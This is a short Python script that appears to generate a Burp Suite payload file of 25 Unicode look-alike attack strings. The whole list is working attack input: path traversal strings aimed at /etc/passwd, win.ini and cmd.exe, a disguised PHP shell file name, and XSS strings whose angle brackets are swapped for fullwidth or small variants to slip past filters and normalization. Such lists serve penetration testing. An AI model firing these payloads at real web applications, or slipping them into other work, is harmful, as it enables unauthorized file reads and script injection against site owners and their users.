# unicode_payload_gen.py

# We use Python's native unicode string handling to define the characters.
raw_payloads = [
    # --- PATH TRAVERSAL (UNIX / LINUX TARGETS) ---
    # Targeting the Slash (/)
    "..\u2044..\u2044..\u2044etc\u2044passwd",
    "..\u2215..\u2215..\u2215etc\u2215passwd",
    "..\uff0f..\uff0f..\uff0fetc\uff0fpasswd",

    # Targeting the Dot (.)
    "\u2024\u2024/\u2024\u2024/\u2024\u2024/etc/passwd",
    "\uff0e\uff0e/\uff0e\uff0e/\uff0e\uff0e/etc/passwd",

    # Targeting Both Dots and Slashes
    "\u2024\u2024\u2044\u2024\u2024\u2044\u2024\u2024\u2044etc\u2044passwd",
    "\uff0e\uff0e\uff0f\uff0e\uff0e\uff0f\uff0e\uff0e\uff0fetc\uff0fpasswd",
    "\u2024\u2024\u2215\u2024\u2024\u2215\u2024\u2024\u2215etc\u2215passwd",
    "\uff0e\uff0e/.\uff0e/..\uff0fetc\uff0fpasswd",

    # File Extension Bypass
    "image.png\u2044..\u2044..\u2044..\u2044etc\u2044passwd",
    "image.png\uff0f..\uff0f..\uff0f..\uff0fetc\uff0fpasswd",
    "shell\uff0ephp",

    # --- PATH TRAVERSAL (WINDOWS TARGETS) ---
    # Targeting the Backslash (\)
    "..\ufe68..\ufe68..\ufe68windows\ufe68win.ini",
    "..\uff3c..\uff3c..\uff3cwindows\uff3cwin.ini",

    # Targeting Both Dots and Backslashes
    "\u2024\u2024\ufe68\u2024\u2024\ufe68\u2024\u2024\ufe68windows\ufe68win.ini",
    "\uff0e\uff0e\uff3c\uff0e\uff0e\uff3c\uff0e\uff0e\uff3cwindows\uff3cwin.ini",

    # Drive Letter Injection (Targeting the Colon :)
    "C\uff1a\uff3cwindows\uff3csystem32\uff3ccmd.exe",

    # --- CROSS-SITE SCRIPTING (XSS) ---
    # Targeting Angle Brackets (< and >) with Fullwidth Variants
    "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
    "\uff1cimg src=x onerror=alert(1)\uff1e",
    "\uff1csvg onload=alert(1)\uff1e",
    "\uff1ciframe src=javascript:alert(1)\uff1e\uff1c/iframe\uff1e",

    # Targeting Angle Brackets (< and >) with Small Variants
    "\ufe64script\ufe65alert(1)\ufe64/script\ufe65",
    "\ufe64img src=x onerror=alert(1)\ufe65",
    "\ufe64body onload=alert(1)\ufe65",

    # Mixed XSS File Upload Payload
    "\ufe64a href=\"javascript:alert(1)\"\ufe65Click_Here\ufe64/a\ufe65.jpg"
]

# Write to file forcing UTF-8 encoding
with open("burp_unicode_payloads.txt", "w", encoding="utf-8") as f:
    for payload in raw_payloads:
        f.write(payload + "\n")

print("[+] Successfully generated burp_unicode_payloads.txt with 25 UTF-8 payloads.")